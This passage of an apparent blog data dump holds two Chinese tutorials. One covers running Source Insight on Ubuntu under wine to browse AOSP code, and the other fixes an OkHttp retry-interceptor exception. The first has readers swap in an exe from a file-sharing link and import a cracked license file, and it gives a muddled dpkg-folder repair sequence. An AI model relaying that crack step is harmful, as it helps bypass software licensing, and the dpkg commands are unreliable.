href=\"https://www.jianshu.com/p/b7b19bcc0425\">https://www.jianshu.com/p/b7b19bcc0425</a><br><strong>讲几点注意事项：</strong><br>1、导入成功后打开了SI主界面，但怎么啥都看不见？不要慌，这时候点一下菜单栏里的 <strong>File &gt; Open</strong> 就好了。<br>2、如果发现菜单栏里的按钮都点不动怎么办？这个可能是wine的Bug，不要慌，多点几下SI主界面中间的空白处或者最小化再最大化一下，再去点 File 菜单，看是不是可以获取焦点了？<br>3、到此我们总算可以查看源码了，但按住Ctrl点击各种方法和变量等等，怎么提示 <strong>Symbol Not Found</strong> 呢？这是没建立索引的原因，选择菜单栏里的 <strong>Project &gt; Synchronize Files</strong> 即可， <strong>这个过程非常久，可能要数小时</strong> （如果你导入了全部AOSP源码的话），总之一定要耐心等待，中途可能会导致SI整个界面停止响应，不要动，过一会儿就好了，Sync这一次以后就再也不用了（除非你文件有较大变动）。<br>如果Sync实在太慢，最开始就不要Add太多文件，选择几个需要的，再Add Tree即可。</p>\n<h3 id=\"第四步：SI主题改为IDEA的Darcula暗黑风格\"><a href=\"#第四步：SI主题改为IDEA的Darcula暗黑风格\" class=\"headerlink\" title=\"第四步：SI主题改为IDEA的Darcula暗黑风格\"></a>第四步：SI主题改为IDEA的Darcula暗黑风格</h3><p>1、默认字体太小了，我们先改改字体大小：<br>按 <strong>Alt + Y</strong> 快捷键（或者菜单栏 <strong>Options &gt; File Type Options</strong>），然后改你喜欢的字体和大小即可：<br><img src=\"https://imgconvert.csdnimg.cn/20190816223801624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>改后确定会弹出一个窗口让你输入 <strong>yes</strong> ，是否应用于所有文件类型，我一般都是yes。<br>2、如何设置和IDEA一样的暗黑风格，如果不想自己一点一点手工DIY的同学，可以直接按我的来做：<br>先把整体主题设为自带的Black：<br>点击 <strong>Options &gt; Visual Theme &gt; Black</strong>，<br>然后点击菜单栏 <strong>Options &gt; Style Properties</strong> ，在弹出的窗口中选择右边的 <strong>Load</strong> 按钮，选择网盘中下载的 <strong>darcula-as.xml</strong> 文件即可，Done。</p>\n<h3 id=\"附件\"><a href=\"#附件\" class=\"headerlink\" title=\"附件\"></a>附件</h3><p>链接: <a href=\"https://pan.baidu.com/s/1wVI61SDojBvxffNHct6NHQ\">https://pan.baidu.com/s/1wVI61SDojBvxffNHct6NHQ</a> 提取码: <strong>ij4s</strong> 复制这段内容后打开百度网盘手机App，操作更方便哦！<br><img src=\"https://imgconvert.csdnimg.cn/20190816230010151.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h3 id=\"预览\"><a href=\"#预览\" class=\"headerlink\" title=\"预览\"></a>预览</h3><p>先来张图给大家感受下效果，然后我再慢慢道来过程，保证你避免每一步的坑。<br><img src=\"https://imgconvert.csdnimg.cn/20190816214656427.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"preview\"></p>\n<h3 id=\"我们要做什么\"><a href=\"#我们要做什么\" class=\"headerlink\" title=\"我们要做什么\"></a>我们要做什么</h3><p>1、由于Source Insight（以下简称SI）是Windows应用，所以不能直接安装在Linux上，于是我们要借助wine，所以第一步会介绍wine的安装过程和坑；<br>2、介绍SI在Linux（以Ubuntu 16.04为例）上的安装，并介绍如何导入免费证书（个人建议大家有条件还是付费支持一下SI这个软件，真的是个好东西，比IDEA看源码实在快太多了，我已经买了最新版4.0，还是挺良心的，一次性付费，239美刀）；<br>3、用SI导入AOSP源码并Sync文件建立索引，开头那张截图就是正在Sync，建立完成后就可以快速导航各个方法类引用等等了；<br>4、默认主题太刺眼，怎么办？还是习惯IDEA的风格，没事，我配置都写好了，只用你一键导入并改改字体大小即可！</p>\n<h3 id=\"第一步：安装wine\"><a href=\"#第一步：安装wine\" class=\"headerlink\" title=\"第一步：安装wine\"></a>第一步：安装wine</h3><p>直接命令走起：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install wine</span><br></pre></td></tr></table></figure>\n<p>过程中终端会显示一个确定页面，按Tab键选中并确定即可，然后再选“是”。<br>一般来说由于依赖问题，上述命令都是不能一次性安装成功的，这时候直接：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install -f</span><br></pre></td></tr></table></figure>\n<p>好，我已经看穿了一切，这一步估计大多数用户依然是要出错的，且错误提示：</p>\n<blockquote>\n<p>dpkg: 处理归档<br>&#x2F;var&#x2F;cache&#x2F;apt&#x2F;archives&#x2F;xxx.deb<br>(–unpack)时出错：  尝试覆盖共享的……</p>\n</blockquote>\n<p>巴拉巴拉这类鬼东西，如果你也是，那么很好，下面一套连招即可解决：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo mv /var/lib/dpkg/info /var/lib/dpkg/info_back</span><br><span class=\"line\">sudo mkdir /var/lib/dpkg/info</span><br><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get install -f</span><br><span class=\"line\">sudo mv /var/lib/dpkg/info /var/lib/dpkg/info_back</span><br><span class=\"line\">sudo mv /var/lib/dpkg/info_back /var/lib/dpkg/info</span><br></pre></td></tr></table></figure>\n<p>安装成功后执行一下wine命令，没提示错误即可。</p>\n<h3 id=\"第二步：安装SI\"><a href=\"#第二步：安装SI\" class=\"headerlink\" title=\"第二步：安装SI\"></a>第二步：安装SI</h3><p>先去官网下载最新版的exe：<a href=\"https://www.sourceinsight.com/download/\">https://www.sourceinsight.com/download/</a><br>我这里版本号是4.0.0098，建议和我一样，如果下载困难的，可直接在我文末的网盘中下载本文所有资源。<br>用wine命令安装SI：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wine sourceinsight4098-setup.exe</span><br></pre></td></tr></table></figure>\n<p>这个时候会弹出Windows程序的安装过程，全部下一步即可，没有特殊配置，安装路径也最好不要改。<br>安装完成后你在Ubuntu的应用程序里已经可以搜到SI了，桌面上也会自动创建快捷方式：<br><img src=\"https://imgconvert.csdnimg.cn/20190816221426934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>然后不要急着打开，把网盘里下载下来的另一个exe文件复制到SI安装目录中：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd ~/.wine/drive_c/Program\\ Files\\ \\(x86\\)/Source\\ Insight\\ 4.0/</span><br><span class=\"line\">cp ~/你下载并解压后的目录文件夹/sourceinsight4.exe sourceinsight4.exe</span><br></pre></td></tr></table></figure>\n<p>copy覆盖后，再打开SI，此时会弹出授权弹窗，选第三个导入证书，这时候选网盘里下载下来的si4.pediy.lic文件即可。</p>\n<h3 id=\"第三步：导入Android源码\"><a href=\"#第三步：导入Android源码\" class=\"headerlink\" title=\"第三步：导入Android源码\"></a>第三步：导入Android源码</h3><p>成功打开进入SI之后，首次使用会提示import symbol之类的，可以不用管，直接关掉。<br>然后会继续提示是否创建一个新Project，这个时候就选是了，随便取个名字，然后点 <strong>Browser</strong>，选择自己的源码所在的目录即可，再 <strong>Add All</strong> 并勾选 <strong>子目录</strong> 就可以导入了。<br>这一步比较简单我就不赘述了，具体图文步骤可参考：<a href=\"https://www.jianshu.com/p/b7b19bcc0425\">https://www.jianshu.com/p/b7b19bcc0425</a><br><strong>讲几点注意事项：</strong><br>1、导入成功后打开了SI主界面，但怎么啥都看不见？不要慌，这时候点一下菜单栏里的 <strong>File &gt; Open</strong> 就好了。<br>2、如果发现菜单栏里的按钮都点不动怎么办？这个可能是wine的Bug，不要慌，多点几下SI主界面中间的空白处或者最小化再最大化一下，再去点 File 菜单，看是不是可以获取焦点了？<br>3、到此我们总算可以查看源码了，但按住Ctrl点击各种方法和变量等等，怎么提示 <strong>Symbol Not Found</strong> 呢？这是没建立索引的原因，选择菜单栏里的 <strong>Project &gt; Synchronize Files</strong> 即可， <strong>这个过程非常久，可能要数小时</strong> （如果你导入了全部AOSP源码的话），总之一定要耐心等待，中途可能会导致SI整个界面停止响应，不要动，过一会儿就好了，Sync这一次以后就再也不用了（除非你文件有较大变动）。<br>如果Sync实在太慢，最开始就不要Add太多文件，选择几个需要的，再Add Tree即可。</p>\n<h3 id=\"第四步：SI主题改为IDEA的Darcula暗黑风格\"><a href=\"#第四步：SI主题改为IDEA的Darcula暗黑风格\" class=\"headerlink\" title=\"第四步：SI主题改为IDEA的Darcula暗黑风格\"></a>第四步：SI主题改为IDEA的Darcula暗黑风格</h3><p>1、默认字体太小了，我们先改改字体大小：<br>按 <strong>Alt + Y</strong> 快捷键（或者菜单栏 <strong>Options &gt; File Type Options</strong>），然后改你喜欢的字体和大小即可：<br><img src=\"https://imgconvert.csdnimg.cn/20190816223801624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>改后确定会弹出一个窗口让你输入 <strong>yes</strong> ，是否应用于所有文件类型，我一般都是yes。<br>2、如何设置和IDEA一样的暗黑风格，如果不想自己一点一点手工DIY的同学，可以直接按我的来做：<br>先把整体主题设为自带的Black：<br>点击 <strong>Options &gt; Visual Theme &gt; Black</strong>，<br>然后点击菜单栏 <strong>Options &gt; Style Properties</strong> ，在弹出的窗口中选择右边的 <strong>Load</strong> 按钮，选择网盘中下载的 <strong>darcula-as.xml</strong> 文件即可，Done。</p>\n<h3 id=\"附件\"><a href=\"#附件\" class=\"headerlink\" title=\"附件\"></a>附件</h3><p>链接: <a href=\"https://pan.baidu.com/s/1wVI61SDojBvxffNHct6NHQ\">https://pan.baidu.com/s/1wVI61SDojBvxffNHct6NHQ</a> 提取码: <strong>ij4s</strong> 复制这段内容后打开百度网盘手机App，操作更方便哦！<br><img src=\"https://imgconvert.csdnimg.cn/20190816230010151.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lzeTk1MDgwMw==,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n"},{"layout":"post","title":"OkHttp自定义重试拦截器出现IllegalStateException: cannot make a new request……异常","subtitle":"拦截器玩出花。","date":"2019-09-19T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n### 问题\n\nOkHttp自定义重试拦截器常见实现方式：\n\n```java\nprivate static class RetryInterceptor implements Interceptor {\n    @Override\n    public okhttp3.Response intercept(Chain chain) throws IOException {\n        int retryCount = 0;\n        Request request = chain.request();\n        okhttp3.Response response = chain.proceed(request);\n        while (!response.isSuccessful() && retryCount < RETRY_MAX_COUNT) {\n            retryCount++;\n            response = chain.proceed(request);\n        }\n        return response;\n    }\n}\n```\n\n但是没有人告诉我，在3.14.x版本上会出现这个异常：\n\n> AndroidRuntime: java.lang.IllegalStateException: cannot make a new request because the previous response is still open: please call response.close()\n\n第一反应去OkHttp的issue查查，果然有和我同病相怜的：\n[https://github.com/square/okhttp/issues/4986](https://github.com/square/okhttp/issues/4986)\n\n### 解决\n\n```java\nwhile (!response.isSuccessful() && retryCount < RETRY_MAX_COUNT) {\n    retryCount++;\n    response.close(); // 很简单，加上这一句\n    response = chain.proceed(request);\n}\n```\n\n### 调查\n\n虽说很快就解决了，但是要是异常提示不告诉你要close呢，我们就要自己去探索了。所以还是忍不住扒下来源码看了看，搜索这个异常提示位于：\n**okhttp/src/main/java/okhttp3/internal/connection/Transmitter.java**\n可以看到，是在newExchange方法中抛出的异常：\n\n```java\n  /** Returns a new exchange to carry a new request and response. */\n  Exchange newExchange(Interceptor.Chain chain, boolean doExtensiveHealthChecks) {\n    synchronized (connectionPool) {\n      if (noMoreExchanges) {\n        throw new IllegalStateException(\"released\");\n      }\n      if (exchange != null) {\n        throw new IllegalStateException(\"cannot make a new request because the previous response \"\n            + \"is still open: please call response.close()\");\n      }\n    }\n\t……\n  }\n```\n\n为了简单点，我们就直接搜索exchange在什么时候置的空，之所以response.close()能解决问题那就说明close方法最终会调用到exchange = null。查出来2个地方：\n\n```java\n  // 第一个调用处是来自RetryAndFollowUpInterceptor这一内部重试实现，此处可以忽略\n  public void exchangeDoneDueToException() {\n    synchronized (connectionPool) {\n      if (noMoreExchanges) throw new IllegalStateException();\n      exchange = null;\n    }\n  }\n\n  // 这个方法应该才是最终调用\n  @Nullable IOException exchangeMessageDone(\n      Exchange exchange, boolean requestDone, boolean responseDone, @Nullable IOException e) {\n    boolean exchangeDone = false;\n    synchronized (connectionPool) {\n      if (exchange != this.exchange) {\n        return e; // This exchange was detached violently!\n      }\n      boolean changed = false;\n      if (requestDone) {\n        if (!exchangeRequestDone) changed = true;\n        this.exchangeRequestDone = true;\n      }\n      if (responseDone) {\n        if (!exchangeResponseDone) changed = true;\n        this.exchangeResponseDone = true;\n      }\n      // 其实从这里的语义就能看出，只有responseDone了，exchange才会置空，正好对应response.close()\n      if (exchangeRequestDone && exchangeResponseDone && changed) {\n        exchangeDone = true;\n        this.exchange.connection().successCount++;\n        this.exchange = null;\n      }\n    }\n    if (exchangeDone) {\n      e = maybeReleaseConnection(e, false);\n    }\n    return e;\n  }\n```\n\n**回溯一部分调用路径：**\nResponseBodySource#close -> complete --> Exchange#bodyComplete --> Transmitter#exchangeMessageDone\n**然后从Response的close方法开始看**：\n其实就是调用了ResponseBody的close：\n\n```java\n  @Override public void close() {\n    Util.closeQuietly(source());\n  }\n  // source是一个抽象方法，返回的BufferedSource是一个Closeable\n  public abstract BufferedSource source();\n```\n\nRealResponseBody进行了实现：\n\n```java\npublic final class RealResponseBody extends ResponseBody {\n  ……\n  private final BufferedSource source;\n\n  public RealResponseBody(\n      @Nullable String contentTypeString, long contentLength, BufferedSource source) {\n    this.contentTypeString = contentTypeString;\n    this.contentLength = contentLength;\n    this.source = source;\n  }\n  ……\n  @Override public BufferedSource source() {\n    return source;\n  }\n}\n```\n\n正好对应Exchange的openResponseBody方法：\n\n```java\n  public ResponseBody openResponseBody(Response response) throws IOException {\n    try {\n      ……\n      ResponseBodySource source = new ResponseBodySource(rawSource, contentLength);\n      // 将ResponseBodySource的实例作为RealResponseBody的source传入\n      return new RealResponseBody(contentType, contentLength, Okio.buffer(source));\n    } catch (IOException e) {\n      eventListener.responseFailed(call, e);\n      trackFailure(e);\n      throw e;\n    }\n  }\n```\n\n调用就这样合龙了。\n所以我们调用Response#close方法最终就会走到Transmitter#exchangeMessageDone，对exchange置空，这样就不会抛出那个异常了。\n","source":"_posts/2019-09-20-OkHttp自定义重试拦截器出现IllegalStateException-cannot make a new request……异常.md","raw":"---\nlayout:     post\ntitle:      \"OkHttp自定义重试拦截器出现IllegalStateException: cannot make a new request……异常\"\nsubtitle:   拦截器玩出花。\ndate:       2019-09-20\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Android\n---\n\n### 问题\n\nOkHttp自定义重试拦截器常见实现方式：\n\n```java\nprivate static class RetryInterceptor implements Interceptor {\n    @Override\n    public okhttp3.Response intercept(Chain chain) throws IOException {\n        int retryCount = 0;\n        Request request = chain.request();\n        okhttp3.Response response = chain.proceed(request);\n        while (!response.isSuccessful() && retryCount < RETRY_MAX_COUNT) {\n            retryCount++;\n            response = chain.proceed(request);\n        }\n        return response;\n    }\n}\n```\n\n但是没有人告诉我，在3.14.x版本上会出现这个异常：\n\n> AndroidRuntime: java.lang.IllegalStateException: cannot make a new request because the previous response is still open: please call response.close()\n\n第一反应去OkHttp的issue查查，果然有和我同病相怜的：\n[https://github.com/square/okhttp/issues/4986](https://github.com/square/okhttp/issues/4986)\n\n### 解决\n\n```java\nwhile (!response.isSuccessful() && retryCount < RETRY_MAX_COUNT) {\n    retryCount++;\n    response.close(); // 很简单，加上这一句\n    response = chain.proceed(request);\n}\n```\n\n### 调查\n\n虽说很快就解决了，但是要是异常提示不告诉你要close呢，我们就要自己去探索了。所以还是忍不住扒下来源码看了看，搜索这个异常提示位于：\n**okhttp/src/main/java/okhttp3/internal/connection/Transmitter.java**\n可以看到，是在newExchange方法中抛出的异常：\n\n```java\n  /** Returns a new exchange to carry a new request and response. */\n  Exchange newExchange(Interceptor.Chain chain, boolean doExtensiveHealthChecks) {\n    synchronized (connectionPool) {\n      if (noMoreExchanges) {\n        throw new IllegalStateException(\"released\");\n      }\n      if (exchange != null) {\n        throw new IllegalStateException(\"cannot make a new request because the previous response \"\n            + \"is still open: please call response.close()\");\n      }\n    }\n\t……\n  }\n```\n\n为了简单点，我们就直接搜索exchange在什么时候置的空，之所以response.close()能解决问题那就说明close方法最终会调用到exchange = null。查出来2个地方：\n\n```java\n  // 第一个调用处是来自RetryAndFollowUpInterceptor这一内部重试实现，此处可以忽略\n  public void exchangeDoneDueToException() {\n    synchronized (connectionPool) {\n      if (noMoreExchanges) throw new IllegalStateException();\n      exchange = null;\n    }\n  }\n\n  // 这个方法应该才是最终调用\n  @Nullable IOException exchangeMessageDone(\n      Exchange exchange, boolean requestDone, boolean responseDone, @Nullable IOException e) {\n    boolean exchangeDone = false;\n    synchronized (connectionPool) {\n      if (exchange != this.exchange) {\n        return e; // This exchange was detached violently!\n      }\n      boolean changed = false;\n      if (requestDone) {\n        if (!exchangeRequestDone) changed = true;\n        this.exchangeRequestDone = true;\n      }\n      if (responseDone) {\n        if (!exchangeResponseDone) changed = true;\n        this.exchangeResponseDone = true;\n      }\n      // 其实从这里的语义就能看出，只有responseDone了，exchange才会置空，正好对应response.close()\n      if (exchangeRequestDone && exchangeResponseDone && changed) {\n        exchangeDone = true;\n        this.exchange.connection().successCount++;\n        this.exchange = null;\n      }\n    }\n    if (exchangeDone) {\n      e = maybeReleaseConnection(e, false);\n    }\n    return e;\n  }\n```\n\n**回溯一部分调用路径：**\nResponseBodySource#close -> complete --> Exchange#bodyComplete --> Transmitter#exchangeMessageDone\n**然后从Response的close方法开始看**：\n其实就是调用了ResponseBody的close：\n\n```java\n  @Override public void close() {\n    Util.closeQuietly(source());\n  }\n  // source是一个抽象方法，返回的BufferedSource是一个Closeable\n  public abstract BufferedSource source();\n```\n\nRealResponseBody进行了实现：\n\n```java\npublic final class RealResponseBody extends ResponseBody {\n  ……\n  private final BufferedSource source;\n\n  public RealResponseBody(\n      @Nullable String contentTypeString, long contentLength, BufferedSource source) {\n    this.contentTypeString = contentTypeString;\n    this.contentLength = contentLength;\n    this.source = source;\n  }\n  ……\n  @Override public BufferedSource source() {\n    return source;\n  }\n}\n```\n\n正好对应Exchange的openResponseBody方法：\n\n```java\n  public ResponseBody openResponseBody(Response response) throws IOException {\n    try {\n      ……\n      ResponseBodySource source = new ResponseBodySource(rawSource, contentLength);\n      // 将ResponseBodySource的实例作为RealResponseBody的source传入\n      return new RealResponseBody(contentType, contentLength, Okio.buffer(source));\n    } catch (IOException e) {\n      eventListener.responseFailed(call, e);\n      trackFailure(e);\n      throw e;\n    }\n  }\n```\n\n调用就这样合龙了。\n所以我们调用Response#close方法最终就会走到Transmitter#exchangeMessageDone，对exchange置空，这样就不会抛出那个异常了。\n","slug":"OkHttp自定义重试拦截器出现IllegalStateException-cannot make a new request……异常","published":1,"updated":"2024-03-25T07:31:25.855Z","comments":1,"photos":[],"link":"","_id":"cluaufh0o0018the62k1lg5yy","content":"<h3 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h3><p>OkHttp自定义重试拦截器常见实现方式：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">class</span> <span class=\"title class_\">RetryInterceptor</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Interceptor</span> &#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> okhttp3.Response <span class=\"title function_\">intercept</span><span class=\"params\">(Chain chain)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> <span class=\"variable\">retryCount</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"type\">Request</span> <span class=\"variable\">request</span> <span class=\"operator\">=</span> chain.request();</span><br><span class=\"line\">        okhttp3.<span class=\"type\">Response</span> <span class=\"variable\">response</span> <span class=\"operator\">=</span> chain.proceed(request);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (!response.isSuccessful() &amp;&amp; retryCount &lt; RETRY_MAX_COUNT) &#123;</span><br><span class=\"line\">            retryCount++;</span><br><span class=\"line\">            response = chain.proceed(request);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> response;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>但是没有人告诉我，在3.14.x版本上会出现这个异常：</p>\n<blockquote>\n<p>AndroidRuntime: java.lang.IllegalStateException: cannot make a new request because the previous response is still open: please call response.close()</p>\n</blockquote>\n<p>第一反应去OkHttp的issue查查，果然有和我同病相怜的：<br><a href=\"https://github.com/square/okhttp/issues/4986\">https://github.com/square/okhttp/issues/4986</a></p>\n<h3 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h3><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> (!response.isSuccessful() &amp;&amp; retryCount &lt; RETRY_MAX_COUNT) &#123;</span><br><span class=\"line\">    retryCount++;</span><br><span class=\"line\">    response.close(); <span class=\"comment\">// 很简单，加上这一句</span></span><br><span class=\"line\">    response = chain.proceed(request);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"调查\"><a href=\"#调查\" class=\"headerlink\" title=\"调查\"></a>调查</h3><p>虽说很快就解决了，但是要是异常提示不告诉你要close呢，我们就要自己去探索了。所以还是忍不住扒下来源码看了看，搜索这个异常提示位于：<br><strong>okhttp&#x2F;src&#x2F;main&#x2F;java&#x2F;okhttp3&#x2F;internal&#x2F;connection&#x2F;Transmitter.java</strong><br>可以看到，是在newExchange方法中抛出的异常：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"comment\">/** Returns a new exchange to carry a new request and response. */</span></span><br><span class=\"line\"> Exchange <span class=\"title function_\">newExchange</span><span class=\"params\">(Interceptor.Chain chain, <span class=\"type\">boolean</span> doExtensiveHealthChecks)</span> &#123;</span><br><span class=\"line\">   <span class=\"keyword\">synchronized</span> (connectionPool) &#123;</span><br><span class=\"line\">     <span class=\"keyword\">if</span> (noMoreExchanges) &#123;</span><br><span class=\"line\">       <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IllegalStateException</span>(<span class=\"string\">&quot;released&quot;</span>);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">     <span class=\"keyword\">if</span> (exchange != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">       <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IllegalStateException</span>(<span class=\"string\">&quot;cannot make a new request because the previous response &quot;</span></span><br><span class=\"line\">           + <span class=\"string\">&quot;is still open: please call response.close()&quot;</span>);</span><br><span class=\"line\">     &#125;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">……</span><br><span class=\"line\"> &#125;</span><br></pre></td></tr></table></figure>\n\n<p>为了简单点，我们就直接搜索exchange在什么时候置的空，之所以response.close()能解决问题那就说明close方法最终会调用到exchange &#x3D; null。查出来2个地方：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 第一个调用处是来自RetryAndFollowUpInterceptor这一内部重试实现，此处可以忽略</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">exchangeDoneDueToException</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">synchronized</span> (connectionPool) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (noMoreExchanges) <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">IllegalStateException</span>();</span><br><span class=\"line\">    exchange = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 这个方法应该才是最终调用</span></span><br><span class=\"line\"><span class=\"meta\">@Nullable</span> IOException <span class=\"title function_\">exchangeMessageDone</span><span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">    Exchange exchange, <span class=\"type\">boolean</span> requestDone, <span class=\"type\">boolean</span> responseDone, <span class=\"meta\">@Nullable</span> IOException e)</span> &#123;</span><br><span class=\"line\">  <span class=\"type\">boolean</span> <span class=\"variable\">exchangeDone</span> <span class=\"operator\">=</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  <span class=\"keyword\">synchronized</span> (connectionPool) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (exchange != <span class=\"built_in\">this</span>.exchange) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> e; <span class=\"comment\">// This exchange was detached violently!</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"type\">boolean</span> <span class=\"variable\">changed</span> <span class=\"operator\">=</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (requestDone) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!exchangeRequestDone) changed = <span class=\"literal\">true</span>;</span><br><span class=\"line\">      <span class=\"built_in\">this</span>.exchangeRequestDone = <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (responseDone) &#123;</span><br><span 